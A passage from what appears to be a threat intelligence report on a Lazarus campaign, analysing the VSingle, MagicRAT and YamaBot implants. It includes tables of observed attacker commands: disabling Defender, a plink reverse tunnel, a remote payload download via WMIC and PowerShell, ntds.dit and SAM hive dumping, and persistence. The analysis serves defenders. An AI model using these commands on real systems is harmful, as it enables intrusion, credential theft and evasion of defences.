HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</td><td>System config - disable UAC</td></tr><tr><td class="threat-name-col">cmd.exe /u /c reg add HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa /v LmCompatibilityLevel /t REG_DWORD /d 0 /f</td><td>System config - LAN Man compatibility</td></tr></tbody></table>
<!--kg-card-end: html-->
<p><br><br>These could be used if the RAT is detected/removed or even provide the actors with an RDP access, avoiding the use of a malicious tool.<br><br>With VSingle in place, the attackers can access other systems with the help of two additional tools.<br><br></p><ul><li>pvhost.tmp renamed to pvhost.exe, which is actually plink.exe, a utility from Putty that can create SSH tunnels between systems.</li><li>osc.tmp renamed to osc.exe, which we assess with high confidence is <a href="https://github.com/3proxy/3proxy">3proxy</a>. Unfortunately, Cisco Talos could not obtain a copy of the file.</li></ul><p><br><br>These two tools working together create a proxy on the victim system which has its listening port "exported" to a port on a remote host. This mechanism allows the attacker to have a local proxy port that gives access to the victim network as if the attacker's box was on it directly.<br><br>First, the attackers start the osc.exe (3proxy) to listen on a loopback port (in this example, we chose 8118), with the command below.<br><br>C:\Windows\system32\config\systemprofile\AppData\Roaming\microsoft\osc.exe -i127.0.0.1 -p8118 <br>This alone wouldn't help the attackers, they actually need to have port 8118, exposed on their own network that they can connect to. So, they created an SSH tunnel using <a href="https://documentation.help/PuTTY/plink-usage.html">Plink</a>, but they forwarded a local port to a remote address, in this case, a remote server controlled by the attackers:<br><br>C:\Windows\system32\config\systemprofile\AppData\Roaming\microsoft\pvhost.exe -N -R 18118:127.0.0.1:8118 -P [Port] -l [username] -pw [password] &lt;Remote_IP&gt; <br>The option -R forwards the port8118 on127.0.0.1to the remote server on port18118.<br><br><br></p><h4 id="vsingle-rat-analysis">VSingle RAT Analysis</h4><p><br>The VSingle loader executable is an MFC-based backdoor that consists of multiple layers. The first is responsible for decoding and executing the next layer (layer 2), a shellcode in the memory of the implant process. The shellcode is simply an injector for the next layer (layer 3, also shellcode). The implant spawns a new "explorer.exe" process and injects shellcode (layer 3) into it for execution.<br><br>The layer 3 shellcode is injected into a newly spawned benign process, such as explorer.exe, which consists of decoding another layer (layer 4) of shellcode that is then executed in the benign process.<br><br>Layer 4 is the actual VSingle implant DLL loaded reflectively into the memory of the benign process.<br><br></p><figure class="kg-card kg-image-card"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiXV8vCTiKxHd42b29r7J0H7AN2-fenAGPg_26djAaLDkHHRqjNegrlMbGpG8aUCQ0B8AxUBh5rgCRyansW4U5TlVong6xK-pSBuElj_dCch5a-gw41kF2VJX15GTx_zuR8IhUPX9p0ApxiuoVJjQlhwQuuhxEe6tkG6B94DYJGDGNk2X2iVguS6iE8AA/s16000/image5.jpg" class="kg-image" alt="" loading="lazy" width="1999" height="887"></figure><p><br><br><br>The implant is simple in terms of functionalities and is basically a stager that enables the attackers to deploy more malware on the infected system. It also includes the ability to open a reverse shell that connects to the C2 server and allows untethered access to the attackers to the endpoint to execute commands via "cmd.exe."<br><br>Although a rather simple RAT, VSingle can download and execute additional plugins from the C2 server. These plugins can either be in the form of shellcode or script files of specific formats served by the C2. The image below shows the code used to execute a shellcode downloaded.<br><br></p><figure class="kg-card kg-image-card"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiuVTHSx0x4zJ4zjSrUvezA-BGSmooyPptsXVQvSk_3r0j3SCnfQUXoAXeZ41ws3PETkoJTRnmnF7qP2Sf6ogbfYZCNPMTRn58cg3nj9Jps7GU62esuyTD7WrrS7U7TahhzsKyK0ZEQ7EAHx3P2fK7OL8SwNNq5l8cXZo037b0_8XGP6-0sif75N69HCA/w640-h406/image10.png" class="kg-image" alt="" loading="lazy" width="640" height="406"></figure><p><br>In-memory shellcode execution by the implant.<br>For simpler cases, the implant can receive executables or scripts, save them into a file in the%temp%directory and execute them on the endpoint. The implant supports the .vbs, .bat and .tmp files, since all of them are executed through "cmd /c." The .tmp files can also be loaded as executables (.exe).<br><br>The implant can achieve persistence for malware artifacts served and specified by the C2 server. The simpler mechanism is the creation of a file in the Startup folders, which is done in two different locations:<br><br></p>
<!--kg-card-begin: html-->
<table class="threats-table"><tbody><tr><td class="threat-name-col">c:\Documents and Settings\%s\Start Menu\Programs\Startup\%s</td></tr><tr><td class="threat-name-col">%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\</td></tr></tbody></table>
<!--kg-card-end: html-->
<p><br><br>Additionally, there are three other ways available, all of which use the "cmd.exe /c" command, that the VSingle operators can use:<br><br></p>
<!--kg-card-begin: html-->
<table class="threats-table"><thead><tr><th width="400px">Command</th><th width="200px">Intent</th></tr></thead><tbody><tr><td class="threat-name-col">sc create "%s" DisplayName= "%s" type= own type= interact start= auto error= ignore binpath= "cmd.exe /k start \"\" \"%s\"</td><td>Auto start Service Creation [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1543/003/&quot;}" href="https://attack.mitre.org/techniques/T1543/003/">T1543/003</a>]</td></tr><tr><td class="threat-name-col">reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ /v "%s" /t REG_SZ /d "%s" /f</td><td>Run registry key [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1547/001/&quot;}" href="https://attack.mitre.org/techniques/T1547/001/">T1547/001</a>]</td></tr><tr><td class="threat-name-col">schTasks /Create /F /TN "%s" /TR "%s" /SC onlogon</td><td>Scheduled task triggered at logon [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1053/005/&quot;}" href="https://attack.mitre.org/techniques/T1053/005/">T1053/005</a>]</td></tr><tr><td class="threat-name-col">schtasks /create /tn &lt;task_name&gt; /tr C:\\Windows\\upsvc.exe /sc onstart /ru System /rl highest /f</td><td>Scheduled task triggered at system start with high priority [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1053/005/&quot;}" href="https://attack.mitre.org/techniques/T1053/005/">T1053/005</a>]</td></tr></tbody></table>
<!--kg-card-end: html-->
<p><br><br><br></p><h3 id="victim-no-2-the-discovery-of-magicrat">Victim No. 2: The discovery of MagicRAT</h3><p><br>In another victim's network, we saw a similar chain of events: initial recon followed by disabling the AV software and the deployment of a bespoke implant. We also observed successful lateral movement into other endpoints in the enterprise.<br><br></p><figure class="kg-card kg-image-card"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiBsoLEh0W9Ajnf-Kh9sqgXTqS2GzECw3Mxpv-z8WH7CljlazSea11bwFflajyIaecBqIMtAh4TT__thmO25kNehrX-t85f5WmdmhBkEaDxMuM_5BM-6BlD8EVfEwZY38Pj4UuttN91nq4ZDYdoahheZgbxMdD83en7A7aIjCCUxLAP7aaL3Cz9qE5oiQ/w400-h276/image1.png" class="kg-image" alt="" loading="lazy" width="400" height="276"></figure><p><br><br>What's unique in this intrusion, however, is that we observed the deployment of a fairly new implant three days before the attackers deployed VSingle on the infected systems.<br><br>This implant called "MagicRAT" is outlined in <a href="https://blog.talosintelligence.com/2022/09/lazarus-magicrat.html">a recently published post</a>. The reverse interactive shell eventually downloads MagicRAT from a remote location.<br><br><br></p><h4 id="magicrat-analysis">MagicRAT Analysis</h4><p><br>In this campaign, MagicRAT was configured with a different configuration file and path. It also reported to different C2 servers. The configuration directory is now called "<strong>MagicMon</strong>" in the current user's "AppData\Roaming" directory. As seen in the screenshot below, this folder creates and hosts an initialization file named "<strong>MagicSystem.ini</strong>." This INI file contains several configurations including the list of C2 URLs that can be used by the implant to send and receive commands and data.<br><br></p><figure class="kg-card kg-image-card"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2eIiX8jjyUm2YOIOP74Ucp3Qq0KA9S-IaZhwZlhDhmwLK8eyTv3Lftznag4ohf41x0kV1Tkq6p6V_viSGkbfallNJDSMRcSAq2L9wqXlCb9ivs_as080-_f1tCKvbclG7kOIczkSaYaSwmAgeHiMNc93y5bw4734hw_XBJ3GYuLmqIx13yhW9I-6nYQ/w640-h230/image2.png" class="kg-image" alt="" loading="lazy" width="640" height="230"></figure><p><br>INI file containing the list of base64 encoded C2 URLs.<br><br></p><h4 id="lateral-movement">Lateral Movement</h4><p><br>During the first few days after the successful initial access, the attackers conducted limited reconnaissance of the endpoint and deployed two different malware families MagicRAT and VSingle on the infected endpoint to maintain covert access to the system. Just like with the first victim, the attackers then started to perform Active Directory (AD) related explorations (via impacket and VSingle) to identify potential endpoints to laterally move into. The table below illustrates the commands executed to perform such actions.<br><br></p>
<!--kg-card-begin: html-->
<table class="threats-table"><thead><tr><th width="400px">Command</th><th width="200px">Intent</th></tr></thead><tbody><tr><td class="threat-name-col">powershell.exe Get-NetUser 1&gt; \\127.0.0.1\ADMIN$\&lt;impacket_log_file&gt; 2&gt;&amp;1</td><td>User Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1033/&quot;}" href="https://attack.mitre.org/techniques/T1033/">T1033</a>]</td></tr><tr><td class="threat-name-col">powershell.exe Get-ADDomain 1&gt; \\127.0.0.1\ADMIN$\&lt;impacket_log_file&gt; 2&gt;&amp;1</td><td>Account/Domain Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1087/&quot;}" href="https://attack.mitre.org/techniques/T1087/">T1087</a>]</td></tr><tr><td class="threat-name-col">powershell.exe Get-ADUser &lt;server&gt; -Properties * 1&gt; \\127.0.0.1\ADMIN$\&lt;impacket_log_file&gt; 2&gt;&amp;1</td><td>User Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1033/&quot;}" href="https://attack.mitre.org/techniques/T1033/">T1033</a>]</td></tr><tr><td class="threat-name-col">powershell.exe Get-ADUser -Filter * 1&gt; \\127.0.0.1\ADMIN$\&lt;impacket_log_file&gt; 2&gt;&amp;1</td><td>User Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1033/&quot;}" href="https://attack.mitre.org/techniques/T1033/">T1033</a>]</td></tr><tr><td class="threat-name-col">powershell.exe Get-ADGroup -filter * 1&gt; \\127.0.0.1\ADMIN$\&lt;impacket_log_file&gt; 2&gt;&amp;1</td><td>Account/Domain Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1087/&quot;}" href="https://attack.mitre.org/techniques/T1087/">T1087</a>]</td></tr><tr><td class="threat-name-col">powershell.exe Get-AdComputer -filter * 1&gt; \\127.0.0.1\ADMIN$\&lt;impacket_log_file&gt; 2&gt;&amp;1</td><td>System Information Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1082/&quot;}" href="https://attack.mitre.org/techniques/T1082/">T1082</a>]</td></tr><tr><td class="threat-name-col">powershell.exe Get-ADComputer -filter {OperatingSystem -Like '*Windows 10*'} -property * | select name, operatingsystem</td><td>System Information Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1082/&quot;}" href="https://attack.mitre.org/techniques/T1082/">T1082</a>]</td></tr><tr><td class="threat-name-col">nslookup &lt;remote_computername&gt;</td><td>Account/Domain Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1087/&quot;}" href="https://attack.mitre.org/techniques/T1087/">T1087</a>]</td></tr><tr><td class="threat-name-col">powershell.exe Get-WMIObject -Class win32_operatingsystem -Computername &lt;remote_computername&gt;</td><td>System Information Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1082/&quot;}" href="https://attack.mitre.org/techniques/T1082/">T1082</a>]</td></tr><tr><td class="threat-name-col">powershell.exe Get-ADUser -Filter * | Select SamAccountName</td><td>User Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1033/&quot;}" href="https://attack.mitre.org/techniques/T1033/">T1033</a>]</td></tr><tr><td class="threat-name-col">powershell.exe Get-AdUser -Filter * -Properties * | Select Name, logonCount</td><td>User Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1033/&quot;}" href="https://attack.mitre.org/techniques/T1033/">T1033</a>]</td></tr><tr><td class="threat-name-col">powershell.exe Get-AdComputer -Filter * -Properties * | select Name, LastLogonDate, lastLogon, IPv4Address</td><td>Account/Domain Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1087/&quot;}" href="https://attack.mitre.org/techniques/T1087/">T1087</a>]</td></tr></tbody></table>
<!--kg-card-end: html-->
<p><br><br>Once the list of computers and users is obtained, the attackers would manually ping specific endpoints in the list to verify if they are reachable (with an occasional tracert). VSingle deployment on new hosts was done by using WMIC to start a remote process. This process was, in fact, a PowerShell snippet that would download VSingle from a remote system [<a href="https://attack.mitre.org/techniques/T1608/001/">T1608/001</a>].<br><br>WMIC /node:&lt;Computer_Name&gt; process call create "powershell.exe (New-Object System.Net.Webclient).DownloadFile('&lt;remote_location&gt;/svhostw.exe','&lt;local_path&gt;\\svhostww.exe')" <br><br>In some infections, we observed the deployment of impacket tools on other endpoints to move laterally and establish an interactive shell.<br><br>This stage of the attacks was clearly manual work performed by a human operator. While trying to establish interactive remote console sessions, we can see the operators making errors on the commands.<br><br></p>
<!--kg-card-begin: html-->
<table class="threats-table"><thead><tr><th width="100px">Try #</th><th width="400px">Command</th><th width="200px">Result</th></tr></thead><tbody><tr><td class="threat-name-col">1</td><td>Enter-PSSession &lt;ComputerName&gt;</td><td><strong>Failed<span>&nbsp;</span></strong>attempt</td></tr><tr><td class="threat-name-col">2</td><td>Enter-PSSession</td><td><strong>Failed<span>&nbsp;</span></strong>attempt</td></tr><tr><td class="threat-name-col">3</td><td>powershell.exe Enter-PSSession</td><td><strong>Correct<span>&nbsp;</span></strong>command</td></tr></tbody></table>
<!--kg-card-end: html-->
<p><br><br>The attackers typically take their time to explore the infected system by obtaining file listings of multiple directories of interest to them. When files of particular interest are found they are put into a .rar archive for exfiltration, typically via one of the custom-developed implants running on the system.<br><br><br></p><h3 id="victim-no-3-vsingle-makes-way-for-yamabot">Victim No. 3: VSingle makes way for YamaBot</h3><p><br>During one particular intrusion, the attackers first deployed VSingle on the endpoint. However, after the VSingle sample was detected, the attackers were at risk of losing access to the enterprise. Therefore, after repeated failed attempts to deploy VSingle on the endpoints, the attackers then deployed another updated copy of VSingle. After maintaining continued access for a while, the attackers then moved on to the use of another implant â€” YamaBot.<br><br>YamaBot is a custom-made GoLang-based malware family. It uses HTTP to communicate with its C2 servers. It typically begins by sending preliminary system information about the infected endpoint to the C2: computer name, username and MAC address.<br><br><br></p><figure class="kg-card kg-image-card"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEguTUVJk4BTxrm1m-P0Nb_UDpPtDQM1HyNz4LRCec-hHIGU6K1Mbfi_wLZ4Qt8aC2TptD1TfpnPAB50NLr8wuslC276JlNCAgHfMtm6v4aXHo34zde-o9ii4j0LeGyCNU5fqpYexLT30SAh6CW6a-DoMtKopGTlLK-9QQBhyVcNZvWubLfxBIvJ_8zI5g/w478-h640/image9.png" class="kg-image" alt="" loading="lazy" width="478" height="640"></figure><p><br>YamaBot's helper function names.<br>This implant has standard RAT capabilities, including the ability to:<br><br></p><ul><li>List files and directories.</li><li>Send process information to C2.</li><li>Download files from remote locations.</li><li>Execute arbitrary commands on the endpoints.</li><li>Uninstall itself.</li></ul><p><br><br>YamaBot was recently attributed to the Lazarus APT group by <a href="https://blogs.jpcert.or.jp/en/2022/07/yamabot.html">JPCERT</a> who provided an excellent analysis of the implant.<br><br><br></p><h3 id="credential-harvesting">Credential Harvesting</h3><p><br>Apart from the usual recon and deployment of the custom implants, we also observed Lazarus' use of completely different TTPs for credential harvesting. The attackers created backups of volumes that were then used to create a copy of the "ntds.dit" file for exfiltration containing Active Directory data.<br><br></p>
<!--kg-card-begin: html-->
<table class="threats-table"><thead><tr><th width="400px">Command</th><th width="200px">Intent</th></tr></thead><tbody><tr><td class="threat-name-col">vssadmin list shadows /for=C: ^&gt; &lt;local_path&gt;\&lt;log_file&gt; &gt; &lt;local_path&gt;\execute.bat &amp; C:\Windows\system32\cmd.exe /Q /c &lt;local_path&gt;\execute.bat &amp; del &lt;local_path&gt;\execute.bat</td><td>System Information Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1082/&quot;}" href="https://attack.mitre.org/techniques/T1082/">T1082</a>]</td></tr><tr><td class="threat-name-col">vssadmin create shadow /For=C: ^&gt; &lt;local_path&gt;\&lt;log_file&gt; &gt; &lt;local_path&gt;\execute.bat &amp; C:\Windows\system32\cmd.exe /Q /c &lt;local_path&gt;\execute.bat &amp; del &lt;local_path&gt;\execute.bat</td><td>OS Credential Dumping: NTDS [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1003/003/&quot;}" href="https://attack.mitre.org/techniques/T1003/003/">T1003/003</a>]</td></tr><tr><td class="threat-name-col">cmd.exe /C copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit &lt;local_path&gt;\phPzFvOU.tmp ^&gt; &lt;local_path&gt;\&lt;log_file&gt; &gt; &lt;local_path&gt;\execute.bat &amp; C:\Windows\system32\cmd.exe /Q /c &lt;local_path&gt;\execute.bat &amp; del &lt;local_path&gt;\execute.bat</td><td>OS Credential Dumping: NTDS [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1003/003/&quot;}" href="https://attack.mitre.org/techniques/T1003/003/">T1003/003</a>]</td></tr></tbody></table>
<!--kg-card-end: html-->
<p><br><br><br></p><h2 id="the-variations-in-the-playbook">The Variations in the playbook</h2><p><br>The overall structure of the infection chains remained the same across multiple intrusions in this campaign, primarily consisting of the cyber kill chain that we illustrated at the beginning of the campaign section.<br><br>However, there were some key variations that consist of some optional activities conducted by the adversary in different intrusion sets. These variations include the use of:<br><br></p><ul><li>Credential harvesting using tools such as Mimikatz and Procdump.</li><li>Proxy tools to set up SOCKs proxies.</li><li>Reverse tunneling tools such as PuTTY's plink.</li></ul><p><br><br>It is therefore necessary to list all the TTPs used by the adversary across all the intrusions we've discovered in this campaign. This section provides an additional list of TTPs and commands used by the operators along with their corresponding MITRE ATT&amp;CK IDs to help defenders better understand this APT's offensive playbook.<br><br><em><strong>Note:</strong> There is some overlap between operations (common or similar commands) carried out via the reverse shell, the VSingle RAT and impacket tools. This could be because there might be multiple human operators manually executing their own set of commands based on their shift days and timings (without proper handover of information collected and percolated from one operator to another).</em><br><br><br>For example, in one instance, the attackers tried to obtain Active Directory information on one endpoint via PowerShell cmdlets. However, a day later, the attackers used adfind.exe to extract similar information on the same endpoint.<br><br></p><h3 id="disabling-av-components">Disabling AV components<br></h3><p>The threat actors used multiple variations of commands to query information about the installed antivirus software on the endpoints, followed by disabling the Windows Defender antivirus.<br><br></p>
<!--kg-card-begin: html-->
<table class="threats-table"><thead><tr><th width="400px">Command</th><th width="200px">Intent</th></tr></thead><tbody><tr><td class="threat-name-col">cmd /C wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayname</td><td>Security Software Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1518/001/&quot;}" href="https://attack.mitre.org/techniques/T1518/001/">T1518/001</a>]</td></tr><tr><td class="threat-name-col">wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get /format:list</td><td>Security Software Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1518/001/&quot;}" href="https://attack.mitre.org/techniques/T1518/001/">T1518/001</a>]</td></tr><tr><td class="threat-name-col">cmd.exe /Q /c wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName, productState, pathToSignedProductExe 1&gt; \\127.0.0.1\ADMIN$\&lt;log_file_name&gt; 2&gt;&amp;1</td><td>Security Software Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1518/001/&quot;}" href="https://attack.mitre.org/techniques/T1518/001/">T1518/001</a>]</td></tr><tr><td class="threat-name-col">cmd.exe /c powershell -exec bypass -Command Get-MpPreference</td><td>Security Software Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1518/001/&quot;}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/5836960258678762353#">T1518/001</a>]</td></tr><tr><td class="threat-name-col">powershell.exe -ExecutionPolicy Bypass -command Set-MpPreference -DisableRealtimeMonitoring $true</td><td>Impair Defenses [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1562/001/&quot;}" href="https://attack.mitre.org/techniques/T1562/001/">T1562/001</a>]</td></tr><tr><td class="threat-name-col">reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection /s /f DisableRealtimeMonitoring</td><td>Impair Defenses [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1562/001/&quot;}" href="https://attack.mitre.org/techniques/T1562/001/">T1562/001</a>]</td></tr><tr><td class="threat-name-col">powershell -exec bypass -Command Set-MpPreference -SubmitSamplesConsent NeverSendpowershell -exec bypass -Command Set-MpPreference -MAPSReporting Disable</td><td>Impair Defenses [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1562/001/&quot;}" href="https://attack.mitre.org/techniques/T1562/001/">T1562/001</a>]</td></tr><tr><td class="threat-name-col">cmd.exe /c reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender /v DisableAntiSpyWare /t REG_DWORD /d 1</td><td>Impair Defenses [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1562/001/&quot;}" href="https://attack.mitre.org/techniques/T1562/001/">T1562/001</a>]</td></tr></tbody></table>
<!--kg-card-end: html-->
<p><br></p><h3 id="reconnaissance">Reconnaissance</h3><p><br>During the reconnaissance and credential harvesting stage, the attackers gather information about the system, the network â€” including the domain â€” and the installed software. Using a WMIC command, the attackers also collect information about the logical drives of the infected systems.<br><br>Then, the attackers harvest and exfiltrate credentials. During the reconnaissance stage, the attackers specifically check if the RDP port is open. If it is and the attackers decrypt any of the harvested credentials, they would have direct access to the system without the need to install any other backdoor. The complete list of commands is provided in the table below.<br><br></p>
<!--kg-card-begin: html-->
<table class="threats-table"><thead><tr><th width="400px">Command</th><th width="200px">Intent</th></tr></thead><tbody><tr><td class="threat-name-col">cmd.exe /c ipconfig /all</td><td>Network discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1590/&quot;}" href="https://attack.mitre.org/techniques/T1590/">T1590</a>]</td></tr><tr><td class="threat-name-col">cmd.exe /c dir c:"Program Files (x86)</td><td>Installed software [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1518/&quot;}" href="https://attack.mitre.org/techniques/T1518/">T1518</a>]</td></tr><tr><td class="threat-name-col">cmd.exe /c dir c:"Program Files</td><td>Installed software [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1518/&quot;}" href="https://attack.mitre.org/techniques/T1518/">T1518</a>]</td></tr><tr><td class="threat-name-col">cmd.exe /c systeminfo</td><td>System Information Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1082/&quot;}" href="https://attack.mitre.org/techniques/T1082/">T1082</a>]</td></tr><tr><td class="threat-name-col">cmd /C qwinsta</td><td>User Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1033/&quot;}" href="https://attack.mitre.org/techniques/T1033/">T1033</a>]</td></tr><tr><td class="threat-name-col">cmd /C nslookup</td><td>Network discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1590/&quot;}" href="https://attack.mitre.org/techniques/T1590/">T1590</a>]</td></tr><tr><td class="threat-name-col">cmd /C netstat -noa | findstr 3389</td><td>Network discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1590/&quot;}" href="https://attack.mitre.org/techniques/T1590/">T1590</a>]</td></tr><tr><td class="threat-name-col">cmd /C net view /domain</td><td>Domain discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1087/002/&quot;}" href="https://attack.mitre.org/techniques/T1087/002/">T1087/002</a>]</td></tr><tr><td class="threat-name-col">cmd /C wmic logicaldisk get deviceid, size</td><td>System Information Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1082/&quot;}" href="https://attack.mitre.org/techniques/T1082/">T1082</a>]</td></tr><tr><td class="threat-name-col">cmd.exe /c reg query HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp</td><td>System Information Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1082/&quot;}" href="https://attack.mitre.org/techniques/T1082/">T1082</a>]</td></tr><tr><td class="threat-name-col">cmd.exe /Q /c wevtutil qe Microsoft-Windows-TerminalServices-LocalSessionManager/Operational /c:20 /q:*[System [(EventID=25)]] /rd:true /f:text 1&gt; \\127.0.0.1\ADMIN$\&lt;impacket_log_file&gt; 2&gt;&amp;1</td><td>Query event logs - Get RDP session reconnection information</td></tr><tr><td class="threat-name-col">netsh advfirewall firewall add rule name=allow RemoteDesktop dir=in protocol=TCP localport=3389 action=allow</td><td>Modify Firewall [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1562/004/&quot;}" href="https://attack.mitre.org/techniques/T1562/004/">T1562/004</a>]</td></tr><tr><td class="threat-name-col">reg.exe add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 3389 /f</td><td>Configure RDP [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1021/001/&quot;}" href="https://attack.mitre.org/techniques/T1021/001/">T1021/001</a>]</td></tr></tbody></table>
<!--kg-card-end: html-->
<h3 id="credential-harvesting-1">Credential harvesting</h3><p><br>In some intrusions, the attackers saved copies of registry hives for subsequent exfiltration for obtaining credentials and policy information.</p>
<!--kg-card-begin: html-->
<table class="threats-table"><thead><tr><th width="400px">Command</th><th width="200px">Intent</th></tr></thead><tbody><tr><td class="threat-name-col">cmd.exe /c reg save hklm\sam &lt;local_path&gt;\zsam.tmp</td><td>Credential harvesting [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1003/&quot;}" href="https://attack.mitre.org/techniques/T1003/">T1003</a>]</td></tr><tr><td class="threat-name-col">cmd.exe /c reg save hklm\security &lt;local_path&gt;\zsec.tmp</td><td>Credential harvesting [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1003/&quot;}" href="https://attack.mitre.org/techniques/T1003/">T1003</a>]</td></tr><tr><td class="threat-name-col">cmd.exe /c reg save hklm\system &lt;local_path&gt;\zsys.tmp</td><td>Credential harvesting [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1003/&quot;}" href="https://attack.mitre.org/techniques/T1003/">T1003</a>]</td></tr><tr><td class="threat-name-col">&lt;local_path&gt;\rar.exe a &lt;local_path&gt;\zzzzz.tmp &lt;local_path&gt;\zs*.tmp</td><td>Archive Collected Data [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1560/&quot;}" href="https://attack.mitre.org/techniques/T1560/">T1560</a>]</td></tr><tr><td class="threat-name-col">cmd.exe /c copy /y &lt;local_path&gt;\zzzzz.tmp c:"Program Files\"VMware View\server\broker\webapps\portal\webclient\z.tmp</td><td>Archive Collected Data [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1560/&quot;}" href="https://attack.mitre.org/techniques/T1560/">T1560</a>]</td></tr></tbody></table>
<!--kg-card-end: html-->
<h3 id="active-directory-ad-recon">Active Directory (AD) Recon</h3><p><br>The attackers also typically use a malicious batch (.bat) file called "adfind.bat" to execute adfind.exe on some of the infected endpoints to get AD information from the endpoints.<br></p><p><br><br>We also observed the use of dsquery to obtain similar information.</p>
<!--kg-card-begin: html-->
